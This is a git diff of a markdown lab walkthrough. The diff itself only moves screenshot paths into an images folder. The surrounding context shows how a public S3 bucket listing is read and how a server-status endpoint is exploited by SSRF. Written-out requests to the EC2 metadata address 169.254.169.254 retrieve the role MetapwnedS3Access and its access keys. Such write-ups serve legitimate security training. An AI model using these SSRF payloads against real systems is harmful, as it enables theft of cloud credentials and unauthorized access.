@@ -14,11 +14,11 @@ http://app.huge-logistics.com
 
 When we open the website, we can see that it is mostly a static website with very little functionality.
 
-![](Pasted%20image%2020260720233045.png)
+![](./images/Pasted%20image%2020260720233045.png)
 
 After reviewing the source code, we can see that one of the images used has been uploaded from a `S3` bucket in AWS.
 
-![](Pasted%20image%2020260720233134.png)
+![](./images/Pasted%20image%2020260720233134.png)
 
 We can try to list the contents present in the `S3` bucket to check if there is anything worthwhile.
 
@@ -33,13 +33,13 @@ Output:-
 <ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>huge-logistics-storage</Name><Prefix></Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>backup/</Key><LastModified>2023-05-31T22:14:05.000Z</LastModified><ETag>&quot;d41d8cd98f00b204e9800998ecf8427e&quot;</ETag><Size>0</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>backup/cc-export2.txt</Key><LastModified>2023-05-31T22:14:47.000Z</LastModified><ETag>&quot;6f0f13a016c5c9733112808e5a9c8ab4&quot;</ETag><Size>3717</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>backup/flag.txt</Key><LastModified>2023-06-01T14:38:27.000Z</LastModified><ETag>&quot;feec7290559778394ab236c72511442c&quot;</ETag><Size>32</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/</Key><LastModified>2023-05-31T20:40:47.000Z</LastModified><ETag>&quot;d41d8cd98f00b204e9800998ecf8427e&quot;</ETag><Size>0</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/about.jpg</Key><LastModified>2023-05-31T20:42:33.000Z</LastModified><ETag>&quot;049812ea2fa5472a46efa6690fbfc828&quot;</ETag><Size>114886</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/banner.jpg</Key><LastModified>2023-05-31T20:42:34.000Z</LastModified><ETag>&quot;a323e8a8031e252271d79623570d7f27&quot;</ETag><Size>271657</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/blog1.jpg</Key><LastModified>2023-05-31T20:42:35.000Z</LastModified><ETag>&quot;55a0833071afbf93d8e5f610c4da792a&quot;</ETag><Size>48441</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/blog2.jpg</Key><LastModified>2023-05-31T20:42:36.000Z</LastModified><ETag>&quot;d6daaa467634f7a1e143414980fd8e1a&quot;</ETag><Size>32805</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/blog3.jpg</Key><LastModified>2023-05-31T20:42:36.000Z</LastModified><ETag>&quot;3ea02607eb94dabe1215126ae2a9b4ce&quot;</ETag><Size>44570</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/executive.jpg</Key><LastModified>2023-05-31T20:42:37.000Z</LastModified><ETag>&quot;154192d9591f2b192f6c3763e83c65ce&quot;</ETag><Size>20032</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/manager.jpg</Key><LastModified>2023-05-31T20:42:37.000Z</LastModified><ETag>&quot;a261bec614bcd306f007ec5ed3f0d458&quot;</ETag><Size>13368</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/manager1.jpg</Key><LastModified>2023-05-31T20:42:38.000Z</LastModified><ETag>&quot;aeb365777f2f34dec72fdc3a5032edc6&quot;</ETag><Size>18260</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>web/images/signature.jpg</Key><LastModified>2023-05-31T20:42:38.000Z</LastModified><ETag>&quot;96cea2ea8187429d3b2d12e55ea556ef&quot;</ETag><Size>42216</Size><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>
 ```
 
-![](Pasted%20image%2020260720233942.png)
+![](./images/Pasted%20image%2020260720233942.png)
 
 In this output we can see that there is a `flag.txt` file present! Our aim is to try and extract that file.
 
 After checking more functionality of the website, we come across a tab which checks for the server status by sending a site as parameter in the GET request.
 
-![](Pasted%20image%2020260720234012.png)
+![](./images/Pasted%20image%2020260720234012.png)
 
 If the request parameters are not sanitized properly by the backend servers, this is exploitable via SSRF attack.
 
@@ -55,7 +55,7 @@ We will access the metadata of the EC2 instance using the link-local IP address 
 GET /status/status.php?name=169.254.169.254/latest/meta-data
 ```
 
-![](Pasted%20image%2020260720234417.png)
+![](./images/Pasted%20image%2020260720234417.png)
 
 This confirms that the website is vulnerable to SSRF!
 
@@ -65,7 +65,7 @@ We will now try to get the name of the role attached to this EC2 instance.
 GET /status/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials
 ```
 
-![](Pasted%20image%2020260720234603.png)
+![](./images/Pasted%20image%2020260720234603.png)
 
 We got the name of the role - `MetapwnedS3Access`
 
@@ -75,7 +75,7 @@ Now, we will try to get the access keys of this particular role.
 GET /status/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access
 ```
 
-![](Pasted%20image%2020260720234543.png)
+![](./images/Pasted%20image%2020260720234543.png)
 
 We got the access keys! We can now login into the `aws cli` using these keys.
 
